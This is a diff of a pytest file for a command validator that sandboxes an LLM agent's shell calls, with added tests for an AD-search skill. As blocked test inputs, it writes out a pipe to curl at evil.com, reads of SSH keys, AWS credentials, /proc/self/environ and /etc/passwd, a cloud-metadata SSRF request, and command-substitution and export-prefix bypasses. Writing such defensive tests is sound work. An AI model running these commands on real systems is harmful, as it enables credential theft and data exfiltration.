@@ -15,15 +15,18 @@
 """
 from __future__ import annotations
 
-import os
 from types import SimpleNamespace
 
 import pytest
 
+from apps.opspilot.services.skill_executor.path_rewriting_backend import PathRewritingBackend as _PathRewritingBackend
 from apps.opspilot.services.skill_executor.path_rewriting_backend import (
-    PathRewritingBackend as _PathRewritingBackend,
+    extract_skill_names_from_text,
+    normalize_ad_search_args,
+    normalize_sandbox_executable,
+    prepare_execute_command,
+    strip_leading_env_boilerplate,
 )
-
 
 pytestmark = pytest.mark.unit
 
@@ -46,10 +49,10 @@ def _make_self(Cls) -> SimpleNamespace:
 
 
 def _validate(Cls, command: str) -> None:
-    """模拟 deepagents 调用:重写 + 校验。"""
-    from apps.opspilot.services.skill_executor.path_rewriting_backend import (
-        rewrite_sandbox_paths,
-    )
+    """模拟 deepagents 调用:剥 export 前缀 + 归一解释器 + 重写 + 校验。"""
+    from apps.opspilot.services.skill_executor.path_rewriting_backend import rewrite_sandbox_paths
+
+    command = prepare_execute_command(command)
     # 任意 sandbox 路径,_validate_command 内部不读 self._sandbox_dir /
     # self._skills_root(只查 _ALLOWED_COMMANDS / _BLOCKED_PATTERNS)
     rewritten = rewrite_sandbox_paths(command, "/tmp/sandbox", "/tmp/skills")
@@ -64,14 +67,12 @@ def _validate(Cls, command: str) -> None:
 
 def test_curl_command_blocked(tmp_path, PathRewritingBackend):
     """curl 不在白名单,直接被首 token 检查拦下。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="curl"):
         _validate(PathRewritingBackend, "curl https://example.com/")
 
 
 def test_wget_command_blocked(tmp_path, PathRewritingBackend):
     """wget 同上。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="wget"):
         _validate(PathRewritingBackend, "wget https://example.com/file.txt")
 
@@ -79,7 +80,6 @@ def test_wget_command_blocked(tmp_path, PathRewritingBackend):
 def test_curl_pipe_blocked_by_blacklist(tmp_path, PathRewritingBackend):
     """`cat|curl` / `cat|wget` 类管道也被 _BLOCKED_PATTERNS 拦(防止 LLM 用
     白名单命令当管道前缀绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\\\\bcurl\\\\b|\\\\bwget\\\\b"):
         _validate(PathRewritingBackend, "cat /tmp/x | curl https://evil.com/")
 
@@ -87,7 +87,6 @@ def test_curl_pipe_blocked_by_blacklist(tmp_path, PathRewritingBackend):
 def test_curl_in_command_args_blocked(tmp_path, PathRewritingBackend):
     """Python 调 urllib 的间接绕道不被 `\\bcurl\\b` 黑名单命中(没字面 curl),
     但 SSRFValidator 兜底会拦截云元数据 URL — 双层防御任意一层兜住。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
         _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")
 
@@ -95,7 +94,6 @@ def test_curl_in_command_args_blocked(tmp_path, PathRewritingBackend):
 def test_ssrf_169_metadata_blocked(tmp_path, PathRewritingBackend):
     """SSRFValidator 兜底:云元数据 169.254.169.254 直接拒(validate_llm_endpoint 模式
     也只挡云元数据,内网/127.x/localhost 全放)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="网络目标被 SSRF 拦截"):
         _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')\"")
 
@@ -103,7 +101,6 @@ def test_ssrf_169_metadata_blocked(tmp_path, PathRewritingBackend):
 def test_ssrf_localhost_allowed(tmp_path, PathRewritingBackend):
     """LLM 端点宽松模式:127.0.0.1 / localhost / 内网放行(走系统白名单管控)。
     skill 沙箱要调本地 k8s API / 内部服务,所以默认放内网。"""
-    backend = _make_self(PathRewritingBackend)
     # 不抛 — 内网地址在 LLM 端点模式下被允许
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8080/')\"")
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://127.0.0.1:32955/')\"")
@@ -111,7 +108,6 @@ def test_ssrf_localhost_allowed(tmp_path, PathRewritingBackend):
 
 def test_ssrf_private_10_allowed(tmp_path, PathRewritingBackend):
     """LLM 端点宽松模式:10.x / 172.16.x / 192.168.x 放行(企业内网常见)。"""
-    backend = _make_self(PathRewritingBackend)
     # 用 SSRF 不会拒的内网地址(走白名单命令 wget 不会触发黑名单字面拦)
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('http://10.0.0.1/api')\"")
 
@@ -123,49 +119,42 @@ def test_ssrf_private_10_allowed(tmp_path, PathRewritingBackend):
 
 def test_tilde_expansion_blocked(tmp_path, PathRewritingBackend):
     """`~/.ssh/id_rsa` 等隐藏文件路径被 _BLOCKED_PATTERNS 拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"~"):
         _validate(PathRewritingBackend, "cat ~/.ssh/id_rsa")
 
 
 def test_tilde_only_blocked(tmp_path, PathRewritingBackend):
     """`~/path` 形式(`~` 后跟 `/` 再跟任意字符)也算"展开",一拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"~"):
         _validate(PathRewritingBackend, "cat ~/secrets")
 
 
 def test_dollar_home_blocked(tmp_path, PathRewritingBackend):
     """`$HOME` 环境变量展开被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$HOME"):
         _validate(PathRewritingBackend, "cat $HOME/.aws/credentials")
 
 
 def test_dollar_brace_blocked(tmp_path, PathRewritingBackend):
     """`${HOME}` / `${PATH}` 形式被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$\{"):
         _validate(PathRewritingBackend, "cat ${HOME}/.ssh/id_rsa")
 
 
 def test_dollar_var_blocked(tmp_path, PathRewritingBackend):
     """`$PATH` / `$SECRET` / `$USER` 等无大括号形式被拦。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$[A-Z_]"):
         _validate(PathRewritingBackend, "cat $PATH/etc/passwd")
 
 
 def test_dollar_paren_blocked(tmp_path, PathRewritingBackend):
     """`$(...)` 命令替换被拦(防止 `cat $(echo /etc/passwd)` 绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"\$\("):
         _validate(PathRewritingBackend, "cat $(echo /etc/passwd)")
 
 
 def test_backtick_blocked(tmp_path, PathRewritingBackend):
     """反引号命令替换被拦(防止 `` cat `echo /etc/passwd` `` 绕开)。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match=r"`"):
         _validate(PathRewritingBackend, "cat `echo /etc/passwd`")
 
@@ -177,14 +166,12 @@ def test_backtick_blocked(tmp_path, PathRewritingBackend):
 
 def test_proc_self_environ_blocked(tmp_path, PathRewritingBackend):
     """`/proc/self/environ` 读 host 进程 environ(拿 SECRET_KEY/DB_PASSWORD)拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /proc/self/environ")
 
 
 def test_proc_cpuinfo_blocked(tmp_path, PathRewritingBackend):
     """`/proc/cpuinfo` / `/proc/meminfo` 等整 /proc 前缀都拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /proc/cpuinfo")
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
@@ -193,14 +180,12 @@ def test_proc_cpuinfo_blocked(tmp_path, PathRewritingBackend):
 
 def test_dev_fd_blocked(tmp_path, PathRewritingBackend):
     """`/dev/fd/N` 反推进程打开文件,拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /dev/fd/0")
 
 
 def test_dev_shm_blocked(tmp_path, PathRewritingBackend):
     """`/dev/shm/...` 跨进程共享内存,拒。"""
-    backend = _make_self(PathRewritingBackend)
     with pytest.raises(PermissionError, match="拒绝 host 路径"):
         _validate(PathRewritingBackend, "cat /dev/shm/secret")
 
@@ -212,7 +197,6 @@ def test_dev_shm_blocked(tmp_path, PathRewritingBackend):
 
 def test_normal_commands_still_allowed(tmp_path, PathRewritingBackend):
     """核心白名单命令 + 沙箱内路径仍放行(防止修过头误伤正常用法)。"""
-    backend = _make_self(PathRewritingBackend)
     # 应不抛
     _validate(PathRewritingBackend, "ls /skills/foo")
     _validate(PathRewritingBackend, "cat /tmp/x")
@@ -226,9 +210,175 @@ def test_https_external_url_via_python_still_validated(tmp_path, PathRewritingBa
     """公网 URL 不会触发 SSRF 拦截(但仍被 _BLOCKED_PATTERNS 拦 curl/wget 字面)。
     注意:外网 https URL 通过 `python3 -c` 调 urllib 仍要过 SSRFValidator,
     公网不在黑名单网段,应放行。"""
-    backend = _make_self(PathRewritingBackend)
     # 不抛 — 公网 URL 通过 SSRF
     _validate(PathRewritingBackend, "python3 -c \"import urllib.request; urllib.request.urlopen('https://api.github.com/')\"")
+
+
+def test_extract_skill_names_from_text():
+    assert extract_skill_names_from_text("/skills/kubernetes-specialist/SKILL.md") == ["kubernetes-specialist"]
+    assert extract_skill_names_from_text("python3 /skills/pdf/create_pdf.py") == ["pdf"]
+    assert extract_skill_names_from_text("echo hello") == []
+    assert extract_skill_names_from_text("cat /skills/a/x /skills/b/y /skills/a/z") == ["a", "b"]
+
+
+def test_strip_export_and_connector_keeps_python_skill_command():
+    """模型常写 export VAR=1 && python /skills/...；前缀必须剥掉。"""
+    command = "export AD_TIMEOUT=10 && python /skills/ad-domain-ops/scripts/ad_search.py " '--query "administrator" --type user --limit 20'
+    stripped = strip_leading_env_boilerplate(command)
+    assert stripped.startswith("python /skills/ad-domain-ops/scripts/ad_search.py")
+    assert "export" not in stripped
+    assert "AD_TIMEOUT" not in stripped
+
+
+def test_export_and_python_skill_script_allowed(PathRewritingBackend):
+    _validate(
+        PathRewritingBackend,
+        'export AD_TIMEOUT=10 && python /skills/ad-domain-ops/scripts/ad_search.py --query "administrator" --type user',
+    )
+
+
+def test_export_cannot_smuggle_blocked_command(PathRewritingBackend):
+    """剥前缀后仍校验真实命令,export && curl 不能过。"""
+    with pytest.raises(PermissionError, match="curl"):
+        _validate(PathRewritingBackend, "export AD_TIMEOUT=10 && curl https://example.com/")
+
+
+def test_stdout_redirect_and_chain_blocked(PathRewritingBackend):
+    """禁止把技能 stdout 重定向后再 cat — Windows 上会连环失败烧 model_calls。"""
+    with pytest.raises(PermissionError, match="重定向|管道|串联"):
+        _validate(
+            PathRewritingBackend,
+            'python3 /skills/ad-domain-ops/scripts/ad_search.py --query "*" --type user --limit 10 > /tmp/ad_users.json && cat /tmp/ad_users.json',
+        )
+    with pytest.raises(PermissionError, match="重定向|管道|串联"):
+        _validate(
+            PathRewritingBackend,
+            'python3 /skills/ad-domain-ops/scripts/ad_search.py --query "*" --type user --limit 10 > /tmp/ad_users.json',
+        )
+
+
+def test_normalize_usr_bin_python3_to_current_interpreter():
+    """Linux 模型常写 /usr/bin/python3;必须收到当前服务 Python,Windows/Linux 都能跑。"""
+    import sys
+
+    command = "/usr/bin/python3 /skills/ad-domain-ops/scripts/ad_search.py " '--query "administrator" --type user --limit 20'
+    normalized = normalize_sandbox_executable(command, python_executable=sys.executable)
+    assert "/usr/bin/python3" not in normalized
+    assert sys.executable in normalized or f'"{sys.executable}"' in normalized
+    assert "/skills/ad-domain-ops/scripts/ad_search.py" in normalized
+
+
+def test_usr_bin_python3_skill_script_allowed(PathRewritingBackend):
+    _validate(
+        PathRewritingBackend,
+        '/usr/bin/python3 /skills/ad-domain-ops/scripts/ad_search.py --query "administrator" --type user',
+    )
+    _validate(
+        PathRewritingBackend,
+        '/usr/local/bin/python3 /skills/ad-domain-ops/scripts/ad_search.py --query "administrator"',
+    )
+    _validate(
+        PathRewritingBackend,
+        'python3 /skills/ad-domain-ops/scripts/ad_search.py --query "administrator"',
+    )
+
+
+def test_usr_bin_python_glob_still_blocked(PathRewritingBackend):
+    """探主机 /usr/bin/python* 仍拒绝;只放行当解释器调用的绝对路径。"""
+    with pytest.raises(PermissionError, match="拒绝 host 路径"):
+        _validate(PathRewritingBackend, "ls /usr/bin/python*")
+
+
+def test_usr_bin_python3_cannot_read_host_file(PathRewritingBackend):
+    with pytest.raises(PermissionError, match="拒绝 host 路径"):
+        _validate(PathRewritingBackend, "/usr/bin/python3 /etc/passwd")
+
+
+def test_normalize_ad_search_args_fixes_missing_query_and_field_alias():
+    cmd = "python3 /skills/ad-domain-ops/scripts/ad_search.py --limit 10 --field samAccountName"
+    out = normalize_ad_search_args(cmd)
+    assert "--query" in out
+    assert "--attrs samAccountName" in out
+    assert "--field" not in out
+    assert "--type user" in out
+
+
+def test_normalize_ad_search_args_keeps_existing_query():
+    cmd = 'python3 /skills/ad-domain-ops/scripts/ad_search.py --query "admin" --type user'
+    out = normalize_ad_search_args(cmd)
+    assert "--query" in out
+    assert "admin" in out
+    assert "--type user" in out
+    assert "(sAMAccountName=" not in out
+
+
+def test_normalize_ad_search_args_unwraps_ldap_filter_and_filter_prefix():
+    cmd = "python3 /skills/ad-domain-ops/scripts/ad_search.py " '--filter_prefix SM_ --query "*" --type user'
+    out = normalize_ad_search_args(cmd)
+    assert "--filter_prefix" not in out
+    assert "SM_*" in out
+    assert "--query" in out
+
+    cmd2 = r"python3 /skills/ad-domain-ops/scripts/ad_search.py " r'--query "(sAMAccountName=SM_*)\" --type user --attrs sAMAccountName'
+    out2 = normalize_ad_search_args(cmd2)
+    assert "(sAMAccountName=" not in out2
+    assert "SM_*" in out2
+
+    cmd3 = "python3 /skills/ad-domain-ops/scripts/ad_search.py " '--query "sAMAccountName=SM_*" --type user --limit 500 --attrs sAMAccountName'
+    out3 = normalize_ad_search_args(cmd3)
+    assert "sAMAccountName=SM_*" not in out3
+    assert "SM_*" in out3
+    assert "--limit 500" in out3
+
+    cmd4 = "python3 /skills/ad-domain-ops/scripts/ad_search.py " '--query "CN=Admin,DC=bktest,DC=com,DC=cn" --type user'
+    out4 = normalize_ad_search_args(cmd4)
+    assert "CN=Admin,DC=bktest,DC=com,DC=cn" in out4
+
+
+def test_normalize_ad_search_args_fixes_type_users_and_top():
+    cmd = 'python3 /skills/ad-domain-ops/scripts/ad_search.py --type users --top 10 --attr samAccountName --query "*"'
+    out = normalize_ad_search_args(cmd)
+    assert "--type user" in out
+    assert "--limit 10" in out
+    assert "--attrs samAccountName" in out
+    assert "--top" not in out
+    assert "users" not in out.split()
+
+
+def test_prepare_execute_command_strips_help_and_head_pipe():
+    cmd = "python3 /skills/ad-domain-ops/scripts/ad_search.py --help 2>&1 | head -50 " '--query "*" --type user'
+    out = prepare_execute_command(cmd)
+    assert "--help" not in out
+    assert "|" not in out
+    assert "head" not in out
+    assert "2>&1" not in out
+    assert "--query" in out
+    assert "*" in out
+    assert "--type user" in out
+
+
+def test_help_pipe_skill_command_is_allowed_after_normalize(PathRewritingBackend):
+    _validate(
+        PathRewritingBackend,
+        'python3 /skills/ad-domain-ops/scripts/ad_search.py --help 2>&1 | head -50 --query "*" --type user',
+    )
+
+
+def test_normalize_ad_search_args_drops_bare_help():
+    out = normalize_ad_search_args("python3 /skills/ad-domain-ops/scripts/ad_search.py --help")
+    assert "--help" not in out
+    assert "--query" in out
+    assert "*" in out
+
+
+def test_prepare_execute_command_rewrites_ad_search_field_alias():
+    import sys
+
+    out = prepare_execute_command("python3 /skills/ad-domain-ops/scripts/ad_search.py --limit 10 --field samAccountName")
+    assert sys.executable in out or f'"{sys.executable}"' in out
+    assert "--query" in out
+    assert "--attrs samAccountName" in out
+    assert "--field" not in out
 
 
 # =========================================================================
